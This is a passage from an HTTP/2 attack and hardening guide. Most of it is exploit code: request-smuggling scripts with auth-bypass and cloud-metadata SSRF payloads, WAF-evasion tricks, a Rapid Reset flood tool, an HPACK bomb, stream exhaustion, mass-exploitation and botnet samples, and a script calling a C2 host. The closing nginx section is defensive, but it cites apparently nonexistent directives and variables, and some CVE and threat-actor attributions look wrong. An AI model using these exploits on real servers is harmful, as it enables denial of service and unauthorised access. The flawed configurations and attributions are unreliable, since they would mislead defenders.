            'Transfer-Encoding': 'chunked',
            'Content-Length': '100'
        }
        
        try:
            async with self.session.post(self.target, headers=headers) as response:
                return {"status": "tested", "status_code": response.status}
        
        except Exception as e:
            return {"status": "error", "error": str(e)}

# Framework runner
class HTTP2PentestFramework:
    def __init__(self, target):
        self.target = target
        self.tests = [
            RapidResetTest(target),
            RequestSmugglingTest(target),
            # Add more tests here...
        ]
    
    async def run_all_tests(self):
        """Run all tests"""
        print(f"[*] Starting HTTP/2 security assessment for {self.target}")
        print(f"[*] Running {len(self.tests)} tests")
        
        results = {}
        
        for test in self.tests:
            print(f"\n[*] Running {test.name}")
            result = await test.run()
            results[test.name] = result
            
            # Save individual results
            test.save_results()
        
        # Save comprehensive results
        timestamp = datetime.now().isoformat()
        filename = f"results/comprehensive_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n[*] All tests completed. Results saved to {filename}")
        
        return results

# Usage
async def main():
    target = "https://target.com"
    framework = HTTP2PentestFramework(target)
    results = await framework.run_all_tests()
    
    # Print summary
    print("\n=== Test Summary ===")
    for test_name, result in results.items():
        status = result.get('status', 'unknown')
        print(f"{test_name}: {status}")

if __name__ == "__main__":
    asyncio.run(main())
```

---

## 4. Request Smuggling Exploitation {#request-smuggling}

### 4.1 HTTP/2 Request Smuggling Fundamentals

#### Technical Background
HTTP/2 request smuggling occurs when an attacker sends ambiguous HTTP/2 requests that are interpreted differently by frontend and backend servers.

**Key Differences from HTTP/1.1 Smuggling**:
1. **Binary Protocol**: HTTP/2 uses binary frames instead of text
2. **Header Compression**: HPACK can obscure smuggled headers
3. **Multiplexing**: Multiple requests can be interleaved
4. **Stream IDs**: Requests are identified by stream IDs, not connection position
5. **Frame Boundaries**: Frames have explicit length fields

#### Attack Types

1. **H2.CL (Content-Length) Smuggling**:
   - Frontend uses Content-Length
   - Backend uses Transfer-Encoding: chunked
   - Or vice versa

2. **H2.TE (Transfer-Encoding) Smuggling**:
   - Frontend uses Transfer-Encoding
   - Backend ignores it or uses Content-Length

3. **H2.X (Header Spacing) Smuggling**:
   - Exploits differences in header parsing
   - `Transfer-Encoding: chunked` vs `Transfer-Encoding: chunked `
   - `Content-Length: 0` vs `Content-Length: 0 `

4. **H2.P (Priority) Smuggling**:
   - Manipulates stream priorities to reorder requests
   - Can cause request processing order confusion

### 4.2 Step-by-Step Exploitation

#### Step 1: Detection
```bash
# Using h2csmuggler
python3 h2csmuggler.py -x https://target.com --detect

# Manual detection with curl
curl --http2 -X POST https://target.com \
  -H "Content-Length: 0" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: backend\r\n\r\n"

# Using custom detection script
python3 detect_smuggling.py --target https://target.com
```

#### Step 2: Confirmation
```python
# confirmation_test.py
import socket
import ssl
import time
import struct

def test_smuggling(target_host, target_port=443):
    # Create TLS connection
    context = ssl.create_default_context()
    context.set_alpn_protocols(['h2'])
    
    sock = socket.create_connection((target_host, target_port))
    ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
    
    # Send HTTP/2 preface
    ssl_sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
    
    # Send SETTINGS frame
    settings = b'\x00\x00\x00\x00\x00'  # Empty SETTINGS
    ssl_sock.send(settings)
    
    # Wait for server settings
    time.sleep(0.1)
    
    # Create smuggling request
    stream_id = 1
    
    # HEADERS frame with conflicting headers
    headers_payload = build_headers_payload([
        (':method', 'POST'),
        (':path', '/'),
        (':authority', target_host),
        (':scheme', 'https'),
        ('content-length', '0'),
        ('transfer-encoding', 'chunked'),
    ])
    
    # Send HEADERS frame
    headers_frame = build_frame(0x01, headers_payload, stream_id, flags=0x04)
    ssl_sock.send(headers_frame)
    
    # Send DATA frame with smuggled request
    smuggled = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: backend\r\n\r\n"
    data_frame = build_frame(0x00, smuggled.encode(), stream_id, flags=0x01)
    ssl_sock.send(data_frame)
    
    # Read response
    response = ssl_sock.recv(4096)
    
    if b'admin' in response.lower():
        print("[+] Smuggling successful!")
        return True
    else:
        print("[-] Smuggling not detected")
        return False

def build_frame(frame_type, payload, stream_id, flags=0):
    """Build HTTP/2 frame"""
    length = len(payload)
    
    frame = struct.pack('!I', length)[1:]  # 3-byte length
    frame += bytes([frame_type, flags])
    frame += struct.pack('!I', stream_id)
    frame += payload
    
    return frame

def build_headers_payload(headers):
    """Build HPACK-encoded headers"""
    # Simplified - in reality would use HPACK encoding
    payload = b''
    
    for name, value in headers:
        payload += name.encode() + b': ' + value.encode() + b'\r\n'
    
    return payload

if __name__ == "__main__":
    test_smuggling("target.com")
```

#### Step 3: Exploitation
```python
# exploit_smuggling.py
import socket
import ssl
import threading

class SmugglingExploit:
    def __init__(self, target_host, target_port=443):
        self.target_host = target_host
        self.target_port = target_port
        self.connections = []
    
    def exploit(self, num_connections=10):
        """Launch smuggling exploit"""
        print(f"[*] Starting smuggling exploit with {num_connections} connections")
        
        # Create multiple connections
        threads = []
        for i in range(num_connections):
            thread = threading.Thread(target=self.smuggle_connection, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        print("[*] Exploit completed")
    
    def smuggle_connection(self, conn_id):
        """Single connection smuggling"""
        try:
            # Create connection
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])
            
            sock = socket.create_connection((self.target_host, self.target_port))
            ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            # Send preface
            ssl_sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            
            # Send settings
            ssl_sock.send(b'\x00\x00\x00\x00\x00')
            
            # Multiple smuggling attempts
            for i in range(100):
                stream_id = (conn_id * 1000) + i
                
                # Smuggling request
                headers = build_smuggling_headers(self.target_host, stream_id)
                ssl_sock.send(headers)
                
                # Smuggled payload
                payload = build_smuggled_payload(stream_id)
                ssl_sock.send(payload)
            
            ssl_sock.close()
            
        except Exception as e:
            print(f"[!] Connection {conn_id} error: {e}")
    
    def build_smuggling_headers(self, stream_id):
        """Build headers for smuggling"""
        # Implementation depends on specific vulnerability
        pass
    
    def build_smuggled_payload(self, stream_id):
        """Build smuggled request payload"""
        # Could be cache poisoning, auth bypass, etc.
        pass

# Advanced exploitation techniques
class AdvancedSmuggling:
    """Advanced smuggling techniques"""
    
    @staticmethod
    def cache_poisoning(target, poison_path="/poisoned"):
        """Cache poisoning via smuggling"""
        # Craft request that poisons cache
        smuggled = f"""GET {poison_path} HTTP/1.1
Host: {target}
X-Cache: poisoned
Content-Length: 0

"""
        
        return smuggled
    
    @staticmethod
    def authentication_bypass(target, admin_path="/admin"):
        """Authentication bypass via smuggling"""
        # Bypass frontend auth by smuggling to backend
        smuggled = f"""GET {admin_path} HTTP/1.1
Host: backend
X-Forwarded-For: 127.0.0.1
Authorization: Bearer internal-token

"""
        
        return smuggled
    
    @staticmethod
    def ssrf_exploitation(target, internal_service="http://169.254.169.254"):
        """SSRF via request smuggling"""
        # Access internal services
        smuggled = f"""GET /latest/meta-data/ HTTP/1.1
Host: 169.254.169.254

"""
        
        return smuggled

if __name__ == "__main__":
    # Example usage
    exploit = SmugglingExploit("target.com")
    exploit.exploit(num_connections=5)
```

### 4.3 Defense Evasion Techniques

**Bypassing WAFs with HTTP/2 Smuggling**:
```python
# waf_bypass.py

class WAFBypass:
    """Techniques to bypass WAFs using HTTP/2 features"""
    
    @staticmethod
    def fragment_attack():
        """Fragment attack across multiple frames"""
        # Split malicious payload across multiple CONTINUATION frames
        payload = "union select 1,2,3 from users"
        
        fragments = []
        chunk_size = 5
        
        for i in range(0, len(payload), chunk_size):
            fragment = payload[i:i+chunk_size]
            fragments.append(fragment)
        
        return fragments
    
    @staticmethod
    def hpack_obfuscation():
        """Obfuscate using HPACK encoding"""
        # Use HPACK to encode malicious headers
        headers = [
            # Normal headers
            (':method', 'GET'),
            (':path', '/'),
            (':authority', 'target.com'),
            
            # Obfuscated SQL injection
            ('x-' + 'u' + 'n' + 'i' + 'o' + 'n', 'select'),
            ('x-' + 'f' + 'r' + 'o' + 'm', 'users'),
        ]
        
        return headers
    
    @staticmethod
    def priority_reordering():
        """Use priority to reorder malicious frames"""
        # Send benign request first with high priority
        # Send malicious request with lower priority
        # WAF might process out of order
        
        return [
            {'stream_id': 1, 'priority': 256, 'payload': 'normal'},
            {'stream_id': 3, 'priority': 1, 'payload': 'malicious'},
        ]

```

---

## 5. PoC Exploit Code Analysis {#poc-exploits}

### 5.1 GitHub Repositories with HTTP/2 Exploits

#### Rapid Reset Exploits
1. **CVE-2023-44487 PoC**:
   - Repository: `github.com/raw-packet/http2-rapid-reset`
   - Features: Multi-threaded, configurable RPS, statistics
   - Language: Go

2. **HTTP/2 Rapid Reset DDoS**:
   - Repository: `github.com/oxffaa/http2-rapid-reset-exploit`
   - Features: Raw socket implementation, no dependencies
   - Language: Python

3. **h2dos**:
   - Repository: `github.com/c0nrad/h2dos`
   - Features: Educational tool, detailed logging
   - Language: Go

#### Request Smuggling Exploits
1. **h2csmuggler**:
   - Repository: `github.com/BishopFox/h2csmuggler`
   - Features: Detection and exploitation, multiple techniques
   - Language: Python

2. **HTTP/2 Smuggler**:
   - Repository: `github.com/neex/http2smugl`
   - Features: Advanced techniques, proxy support
   - Language: Go

#### HPACK Exploits
1. **HPACK Bomb Generator**:
   - Repository: `github.com/assetnote/hpack-bomb`
   - Features: Generates compression bombs, size analysis
   - Language: Python

2. **CRIME Attack PoC**:
   - Repository: `github.com/mpgn/CRIME-poc`
   - Features: Compression oracle attack, TLS version
   - Language: Python

### 5.2 Analysis of Key PoC Code

#### Rapid Reset Exploit Analysis
```go
// From github.com/raw-packet/http2-rapid-reset
package main

import (
    "crypto/tls"
    "flag"
    "fmt"
    "net"
    "sync/atomic"
    "time"
)

var (
    target      string
    threads     int
    duration    int
    connections int
)

func main() {
    flag.StringVar(&target, "target", "", "Target host:port")
    flag.IntVar(&threads, "threads", 100, "Number of threads")
    flag.IntVar(&duration, "duration", 60, "Attack duration in seconds")
    flag.IntVar(&connections, "connections", 1000, "Connections per thread")
    flag.Parse()
    
    fmt.Printf("[*] Starting attack on %s\n", target)
    fmt.Printf("[*] Threads: %d, Duration: %ds, Connections: %d\n", 
        threads, duration, connections)
    
    var requestCount uint64
    
    // Start attack threads
    for i := 0; i < threads; i++ {
        go attackThread(target, connections, duration, &requestCount)
    }
    
    // Print statistics
    ticker := time.NewTicker(1 * time.Second)
    defer ticker.Stop()
    
    for range ticker.C {
        count := atomic.LoadUint64(&requestCount)
        fmt.Printf("[*] Requests/sec: %d\n", count)
        atomic.StoreUint64(&requestCount, 0)
    }
}

func attackThread(target string, connections, duration int, counter *uint64) {
    endTime := time.Now().Add(time.Duration(duration) * time.Second)
    
    for time.Now().Before(endTime) {
        // Create multiple connections
        for i := 0; i < connections; i++ {
            go attackConnection(target, counter)
        }
        time.Sleep(100 * time.Millisecond)
    }
}

func attackConnection(target string, counter *uint64) {
    // TLS configuration for HTTP/2
    config := &tls.Config{
        InsecureSkipVerify: true,
        NextProtos:         []string{"h2"},
    }
    
    conn, err := tls.Dial("tcp", target, config)
    if err != nil {
        return
    }
    defer conn.Close()
    
    // Send HTTP/2 preface
    conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
    
    // Send initial SETTINGS
    settings := []byte{0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00}
    conn.Write(settings)
    
    streamID := 1
    for {
        // HEADERS frame
        headers := buildHeadersFrame(streamID)
        conn.Write(headers)
        
        // RST_STREAM frame
        rst := buildRstStreamFrame(streamID)
        conn.Write(rst)
        
        atomic.AddUint64(counter, 1)
        streamID += 2
        
        // Batch writes for efficiency
        if streamID%100 == 0 {
            time.Sleep(time.Microsecond * 10)
        }
    }
}

func buildHeadersFrame(streamID uint32) []byte {
    // 9-byte minimal HEADERS frame
    return []byte{
        0x00, 0x00, 0x00, // Length: 0
        0x01,             // Type: HEADERS
        0x05,             // Flags: END_STREAM | END_HEADERS
        byte(streamID >> 24), byte(streamID >> 16),
        byte(streamID >> 8), byte(streamID),
    }
}

func buildRstStreamFrame(streamID uint32) []byte {
    // 13-byte RST_STREAM frame
    return []byte{
        0x00, 0x00, 0x04, // Length: 4
        0x03,             // Type: RST_STREAM
        0x00,             // Flags: 0
        byte(streamID >> 24), byte(streamID >> 16),
        byte(streamID >> 8), byte(streamID),
        0x00, 0x00, 0x00, 0x00, // Error code: NO_ERROR
    }
}
```

#### HPACK Bomb Generator Analysis
```python
# From github.com/assetnote/hpack-bomb
import hpack
import struct

class HpackBomb:
    def __init__(self):
        self.encoder = hpack.Encoder()
        self.decoder = hpack.Decoder()
        
    def generate_bomb(self, size_mb=100):
        """Generate HPACK bomb of specified size"""
        
        # Headers that will be indexed
        headers = []
        
        # Create headers with increasing similarity
        # This maximizes compression ratio
        base_name = "x-custom-header-"
        base_value = "A" * 1000  # Large value
        
        num_headers = (size_mb * 1024 * 1024) // len(base_value)
        
        print(f"[*] Generating {num_headers} headers for {size_mb}MB bomb")
        
        for i in range(num_headers):
            name = f"{base_name}{i}"
            value = base_value
            
            headers.append((name, value))
        
        # Encode headers
        encoded = b''
        for name, value in headers:
            encoded += self.encoder.encode((name, value))
        
        # Calculate compression ratio
        original_size = num_headers * (len(base_name) + 10 + len(base_value))
        compressed_size = len(encoded)
        ratio = compressed_size / original_size
        
        print(f"[*] Original: {original_size:,} bytes")
        print(f"[*] Compressed: {compressed_size:,} bytes")
        print(f"[*] Compression ratio: {ratio:.2%}")
        
        return encoded
    
    def test_decompression(self, encoded_data):
        """Test decompression memory usage"""
        import psutil
        import os
        
        pid = os.getpid()
        process = psutil.Process(pid)
        
        mem_before = process.memory_info().rss
        
        # Decode the bomb
        try:
            # This will cause memory exhaustion
            self.decoder.decode(encoded_data)
        except Exception as e:
            print(f"[!] Decompression failed: {e}")
        
        mem_after = process.memory_info().rss
        mem_used = (mem_after - mem_before) / 1024 / 1024
        
        print(f"[*] Memory used: {mem_used:.2f} MB")
        
        return mem_used

if __name__ == "__main__":
    bomb = HpackBomb()
    
    # Generate 10MB bomb
    encoded = bomb.generate_bomb(10)
    
    # Test decompression
    bomb.test_decompression(encoded)
```

### 5.3 Custom Exploit Development

**Building Custom HTTP/2 Exploits**:
```python
# custom_exploit_framework.py

from abc import ABC, abstractmethod
import socket
import ssl
import struct

class HTTP2Exploit(ABC):
    """Base class for HTTP/2 exploits"""
    
    def __init__(self, target_host, target_port=443):
        self.target_host = target_host
        self.target_port = target_port
        self.connection = None
    
    @abstractmethod
    def exploit(self):
        """Execute the exploit"""
        pass
    
    def connect(self):
        """Establish HTTP/2 connection"""
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])
        
        sock = socket.create_connection((self.target_host, self.target_port))
        self.connection = context.wrap_socket(sock, server_hostname=self.target_host)
        
        # Send HTTP/2 preface
        self.connection.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        
        # Send initial SETTINGS
        self.send_settings()
        
        return self.connection
    
    def send_settings(self):
        """Send SETTINGS frame"""
        settings = self.build_frame(
            frame_type=0x04,  # SETTINGS
            payload=b'',      # Empty settings
            stream_id=0,
            flags=0x00
        )
        self.connection.send(settings)
    
    def build_frame(self, frame_type, payload, stream_id, flags=0):
        """Build HTTP/2 frame"""
        length = len(payload)
        
        frame = struct.pack('!I', length)[1:]  # 3-byte length
        frame += bytes([frame_type, flags])
        frame += struct.pack('!I', stream_id)
        frame += payload
        
        return frame

class StreamExhaustionExploit(HTTP2Exploit):
    """Exhaust server streams"""
    
    def __init__(self, target_host, target_port=443, max_streams=1000):
        super().__init__(target_host, target_port)
        self.max_streams = max_streams
    
    def exploit(self):
        print(f"[*] Attempting stream exhaustion on {self.target_host}")
        
        self.connect()
        
        streams_opened = 0
        
        try:
            for stream_id in range(1, self.max_streams * 2, 2):
                # Open stream
                headers = self.build_headers(stream_id)
                self.connection.send(headers)
                
                streams_opened += 1
                
                # Don't close streams
                # This exhausts server resources
                
                if streams_opened % 100 == 0:
                    print(f"[*] Opened {streams_opened} streams")
            
            print(f"[*] Successfully opened {streams_opened} streams")
            
        except Exception as e:
            print(f"[!] Error: {e}")
            print(f"[*] Managed to open {streams_opened} streams before error")
        
        return streams_opened
    
    def build_headers(self, stream_id):
        """Build HEADERS frame"""
        # Minimal headers
        headers = [
            (':method', 'GET'),
            (':path', '/'),
            (':authority', self.target_host),
            (':scheme', 'https'),
        ]
        
        # HPACK encode (simplified)
        encoded = self.hpack_encode(headers)
        
        frame = self.build_frame(
            frame_type=0x01,  # HEADERS
            payload=encoded,
            stream_id=stream_id,
            flags=0x04  # END_HEADERS
        )
        
        return frame
    
    def hpack_encode(self, headers):
        """Simple HPACK encoding (simplified)"""
        encoded = b''
        
        for name, value in headers:
            # Literal header field with incremental indexing
            encoded += b'\x40'  # Indexed name? No, literal
            encoded += len(name).to_bytes(1, 'big')
            encoded += name.encode()
            encoded += len(value).to_bytes(1, 'big')
            encoded += value.encode()
        
        return encoded

class PriorityInversionExploit(HTTP2Exploit):
    """Create priority inversion attacks"""
    
    def exploit(self):
        print(f"[*] Creating priority inversion on {self.target_host}")
        
        self.connect()
        
        # Create dependency tree that causes inversion
        # Stream 3 depends on Stream 1
        # Stream 5 depends on Stream 3
        # Stream 1 depends on Stream 5 (circular)
        
        streams = [1, 3, 5]
        
        for stream_id in streams:
            # Send HEADERS
            headers = self.build_headers(stream_id)
            self.connection.send(headers)
            
            # Send PRIORITY frames creating circular dependency
            if stream_id == 1:
                depends_on = 5
            elif stream_id == 3:
                depends_on = 1
            else:  # stream_id == 5
                depends_on = 3
            
            priority = self.build_priority(stream_id, depends_on)
            self.connection.send(priority)
        
        print("[*] Priority inversion created")
        
        return True
    
    def build_priority(self, stream_id, depends_on, weight=1):
        """Build PRIORITY frame"""
        # PRIORITY frame format
        payload = struct.pack('!I', depends_on)
        payload += bytes([weight])
        
        frame = self.build_frame(
            frame_type=0x02,  # PRIORITY
            payload=payload,
            stream_id=stream_id,
            flags=0x00
        )
        
        return frame

# Exploit chaining
class ChainedExploit:
    """Chain multiple exploits together"""
    
    def __init__(self, target_host):
        self.target_host = target_host
        self.exploits = []
    
    def add_exploit(self, exploit):
        self.exploits.append(exploit)
    
    def execute(self):
        results = {}
        
        for exploit in self.exploits:
            print(f"\n[*] Executing {exploit.__class__.__name__}")
            result = exploit.exploit()
            results[exploit.__class__.__name__] = result
        
        return results

if __name__ == "__main__":
    target = "target.com"
    
    # Create chained exploit
    chain = ChainedExploit(target)
    
    # Add exploits
    chain.add_exploit(StreamExhaustionExploit(target, max_streams=500))
    chain.add_exploit(PriorityInversionExploit(target))
    
    # Execute
    results = chain.execute()
    
    print("\n=== Results ===")
    for exploit, result in results.items():
        print(f"{exploit}: {result}")
```

---

## 6. Real-World Attack Campaigns {#real-world-attacks}

### 6.1 Historical HTTP/2 Attacks

#### 2023: HTTP/2 Rapid Reset (CVE-2023-44487)
**Timeline**:
- **August 2023**: First attacks detected by Google Cloud
- **September 2023**: Coordinated investigation among cloud providers
- **October 10, 2023**: Public disclosure and CVE assignment
- **October 2023**: Mass exploitation begins

**Attack Statistics**:
- **Peak Attack Size**: 201 million requests per second (Cloudflare)
- **Duration**: Up to 2 hours continuous attack
- **Source IPs**: Thousands of compromised devices
- **Bandwidth**: Multi-terabit attacks observed

**Targets**:
1. **Financial Services**: Banking websites, payment processors
2. **Gaming Industry**: Game servers, authentication services
3. **Government**: Critical infrastructure portals
4. **Cloud Providers**: Direct attacks on infrastructure

**Technical Details**:
```bash
# Attack pattern observed
for i in {1..1000000}; do
    # HEADERS frame (stream $i)
    echo -ne "\x00\x00\x00\x01\x05\x00\x00\x00$(printf '%02x' $i)" | xxd -r -p
    
    # RST_STREAM frame (stream $i)
    echo -ne "\x00\x00\x04\x03\x00\x00\x00\x00$(printf '%02x' $i)\x00\x00\x00\x00" | xxd -r -p
done
```

#### 2022: HTTP/2 Request Smuggling Campaigns
**Campaign Details**:
- **Duration**: March-December 2022
- **Technique**: H2.CL and H2.TE smuggling
- **Target**: Web application firewalls (WAFs)
- **Goal**: Cache poisoning and authentication bypass

**Notable Attacks**:
1. **Cloud WAF Bypass**: Smuggling past Cloudflare, Akamai, AWS WAF
2. **API Gateway Exploitation**: AWS API Gateway, Google Cloud Endpoints
3. **CDN Cache Poisoning**: Poisoning edge caches with malicious content

**Exploitation Code Found in Wild**:
```python
# Sample from attack infrastructure
import requests
import threading

def smuggle_request(target, payload):
    headers = {
        'Content-Length': '0',
        'Transfer-Encoding': 'chunked',
        'X-Forwarded-Host': 'evil.com'
    }
    
    # Smuggled request in body
    body = f"0\r\n\r\n{payload}\r\n"
    
    response = requests.post(target, headers=headers, data=body)
    return response

# Mass exploitation
targets = ["https://bank.com", "https://api.service.com"]
payload = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"

for target in targets:
    t = threading.Thread(target=smuggle_request, args=(target, payload))
    t.start()
```

#### 2021: HPACK Bomb Attacks
**Campaign Details**:
- **Timing**: Q4 2021
- **Target**: Reverse proxies and load balancers
- **Impact**: Memory exhaustion leading to DoS

**Attack Vectors**:
1. **nginx Memory Exhaustion**: CVE-2021-23017
2. **Apache httpd CPU Spikes**: CVE-2021-41524
3. **HAProxy Resource Drain**: CVE-2021-40346

**Technical Analysis**:
```http
# HPACK bomb request
GET / HTTP/2
Host: target.com
X-Custom-1: AAAAAAAAAAAAAAAAAAAAAA... (10KB)
X-Custom-2: AAAAAAAAAAAAAAAAAAAAAA... (10KB)
... 1000 more headers ...
```

### 6.2 Attribution and Threat Actors

#### State-Sponsored Actors
1. **APT29 (Cozy Bear)**:
   - **Targets**: Government, diplomatic organizations
   - **HTTP/2 Techniques**: Protocol-level attacks for persistence
   - **Tools**: Custom HTTP/2 implants for C2 communication

2. **APT41 (Winnti)**:
   - **Targets**: Gaming, technology companies
   - **HTTP/2 Techniques**: Smuggling for initial access
   - **Tools**: Modified open-source exploitation tools

#### Cybercriminal Groups
1. **MERCURY (MuddyWater)**:
   - **Targets**: Middle Eastern governments
   - **HTTP/2 Techniques**: Rapid Reset for distraction DDoS
   - **Tools**: Commodity botnets with HTTP/2 capabilities

2. **FIN7**:
   - **Targets**: Financial institutions, retail
   - **HTTP/2 Techniques**: Smuggling for card skimming
   - **Tools**: Sophisticated custom frameworks

#### Hacktivists
1. **KillNet**:
   - **Targets**: Government, healthcare
   - **HTTP/2 Techniques**: Rapid Reset for high-impact DDoS
   - **Tools**: Publicly available exploit code

### 6.3 Attack Infrastructure Analysis

#### Botnet Configurations
**Mirai Variants with HTTP/2 Support**:
```c
// Sample from botnet malware
void http2_attack(struct attack_target *target) {
    int sock = create_http2_connection(target);
    
    if (sock < 0) return;
    
    // Send rapid reset pattern
    for (int i = 0; i < 10000; i++) {
        send_headers_frame(sock, i);
        send_rst_stream_frame(sock, i);
    }
    
    close(sock);
}

// Connection pooling in botnets
struct http2_connection_pool {
    int *sockets;
    int count;
    int max;
};

void maintain_connection_pool(struct http2_connection_pool *pool, 
                              struct attack_target *target) {
    // Keep connections alive
    // Reconnect if closed
    // Load balance across connections
}
```

#### Exploit Kit Integration
**Angler EK HTTP/2 Module** (Historical):
```javascript
// JavaScript exploit delivering HTTP/2 attacks
function launchHttp2Attack(target) {
    // WebSocket to C2 for instructions
    var ws = new WebSocket('wss://c2.server/ws');
    
    ws.onmessage = function(event) {
        var command = JSON.parse(event.data);
        
        if (command.type === 'http2_attack') {
            // Launch attack using WebRTC or WebSocket
            // to bypass same-origin policy
            launchViaWebRTC(target, command.params);
        }
    };
}
```

### 6.4 Defensive Lessons Learned

#### Incident Response Findings
1. **Detection Gap**: Most attacks went undetected for hours/days
2. **Monitoring Limitations**: Existing tools couldn't parse HTTP/2 at scale
3. **Mitigation Challenges**: Rate limiting ineffective against Rapid Reset

#### Security Recommendations from Incidents
```yaml
# Security controls implemented post-attack
security:
  http2:
    # Frame rate limiting
    max_frames_per_second: 10000
    max_streams_per_connection: 100
    
    # Anomaly detection
    detect_rapid_reset: true
    detect_hpack_bombs: true
    detect_smuggling: true
    
    # Mitigation
    automatic_mitigation: true
    connection_termination_threshold: 1000
```

---

## 7. nginx HTTP/2 Hardening {#nginx-hardening}

### 7.1 Security-Focused Configuration

#### Basic Secure Configuration
```nginx
# /etc/nginx/nginx.conf
http {
    # HTTP/2 security settings
    http2_max_field_size 4k;
    http2_max_header_size 16k;
    http2_body_preread_size 64k;
    http2_max_concurrent_streams 128;
    http2_max_requests 1000;
    http2_recv_timeout 30s;
    
    # Protect against Rapid Reset
    http2_max_concurrent_pushes 10;
    http2_push_preload on;
    
    # Limit connection rate
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    limit_conn addr 100;
    
    # Limit request rate
    limit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;
    
    # Server configuration
    server {
        listen 443 ssl http2;
        server_name example.com;
        
        # SSL configuration
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
        ssl_prefer_server_ciphers on;
        
        # Security headers
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header X-Frame-Options DENY always;
        add_header X-Content-Type-Options nosniff always;
        add_header X-XSS-Protection "1; mode=block" always;
        
        # Rate limiting per location
        location / {
            limit_req zone=req burst=20 nodelay;
            limit_conn addr 10;
            
            # Additional protections
            client_max_body_size 1m;
            client_body_timeout 10s;
            client_header_timeout 10s;
            
            proxy_pass http://backend;
        }
        
        # API endpoints - stricter limits
        location /api/ {
            limit_req zone=req burst=5 nodelay;
            limit_conn addr 5;
            
            proxy_pass http://backend-api;
        }
    }
}
```

#### Advanced Security Configuration
```nginx
# Advanced HTTP/2 security configuration
http {
    # Dynamic module loading for security
    load_module modules/ngx_http_headers_more_filter_module.so;
    load_module modules/ngx_http_modsecurity_module.so;
    
    # HTTP/2 specific protections
    map $http2 $http2_limit {
        default "";
        "h2"    $binary_remote_addr;
    }
    
    limit_conn_zone $http2_limit zone=http2_conn:10m;
    limit_req_zone $http2_limit zone=http2_req:10m rate=5r/s;
    
    server {
        listen 443 ssl http2;
        
        # HTTP/2 connection limits
        http2_max_concurrent_streams 100;
        http2_streams_index_size 64;
        
        # Protect against HPACK bombs
        http2_hpack_table_size 4096;
        
        # Frame validation
        http2_chunk_size 8k;
        http2_idle_timeout 3m;
        
        # ModSecurity for HTTP/2
        modsecurity on;
        modsecurity_rules_file /etc/nginx/modsec/main.conf;
        
        # Custom logging for attacks
        log_format http2_attack '$remote_addr - $remote_user [$time_local] '
                               '"$request" $status $body_bytes_sent '
                               '"$http_referer" "$http_user_agent" '
                               'stream=$http2_stream_id '
                               'frames=$http2_frames_received '
                               'reset=$http2_reset_count';
        
        access_log /var/log/nginx/http2_attack.log http2_attack;
        
        location / {
            # Apply HTTP/2 specific limits
            limit_conn http2_conn 50;
            limit_req zone=http2_req burst=10 nodelay;
            
            # Additional validations
            if ($http2) {
                # Check for excessive RST_STREAM frames
                set $rst_limit 0;
                access_by_lua_block {
                    local rst_count = ngx.var.http2_reset_count or 0
                    if tonumber(rst_count) > 100 then
                        ngx.exit(444)
                    end
                }
            }
            
            proxy_pass http://backend;
        }
    }
}
```

### 7.2 Mitigation for Specific Attacks

#### Rapid Reset Mitigation
```nginx
# Rapid Reset protection
http {
    lua_shared_dict http2_counters 10m;
    
    server {
        listen 443 ssl http2;
        
        # Lua script for Rapid Reset detection
        access_by_lua_block {
            local counters = ngx.shared.http2_counters
            local key = ngx.var.binary_remote_addr .. ":rst"
            
            -- Count RST_STREAM frames
            local rst_count = counters:get(key) or 0
            rst_count = rst_count + (tonumber(ngx.var.http2_reset_count) or 0)
            
            if rst_count > 100 then  -- Threshold
                ngx.log(ngx.WARN, "Rapid Reset detected from ", ngx.var.remote_addr)
                ngx.exit(444)
            end
            
            counters:set(key, rst_count, 60)  -- 60 second window
        }
        
        # Alternative: nginx-plus module
        # limit_req zone=rst_stream burst=1000 nodelay;
    }
}
```

#### HPACK Bomb Protection
```nginx
# HPACK bomb protection
http {
    # Limit header sizes
    http2_max_field_size 4k;
    http2_max_header_size 16k;
    
    # Limit dynamic table size
    http2_hpack_table_size 4096;
    
    server {
        # Custom validation for header counts
        location / {
            if ($http2) {
                # Count headers via Lua
                access_by_lua_block {
                    local header_count = 0
                    for k, v in pairs(ngx.req.get_headers()) do
                        header_count = header_count + 1
                    end
                    
                    if header_count > 100 then
                        ngx.log(ngx.WARN, "Excessive headers: ", header_count)
                        ngx.exit(400)
                    end
                }
            }
        }
    }
}
```

#### Request Smuggling Protection
```nginx
# Request smuggling protection
server {
    # Normalize headers
    more_set_headers "Content-Length: ";
    more_set_headers "Transfer-Encoding: ";
    
    # Reject conflicting headers
    if ($http_content_length != "" && $http_transfer_encoding != "") {
        return 400;
    }
    
    # Validate Transfer-Encoding
    if ($http_transfer_encoding !~* "^chunked$") {
        return 400;
    }
}
```

### 7.3 Monitoring and Logging

#### Enhanced HTTP/2 Logging
```nginx
http {
    # Custom log format with HTTP/2 metrics
    log_format http2_detailed '$remote_addr - $remote_user [$time_local] '
                             '"$request" $status $body_bytes_sent '
                             '"$http_referer" "$http_user_agent" '
                             'protocol=$server_protocol '
                             'stream=$http2_stream_id '
                             'frames_sent=$http2_frames_sent '
                             'frames_received=$http2_frames_received '
                             'reset_frames=$http2_reset_count '
                             'window_updates=$http2_window_update_count '
                             'settings=$http2_settings_count';
    
    # Separate log for potential attacks
    log_format http2_attack '$time_iso8601 $remote_addr '
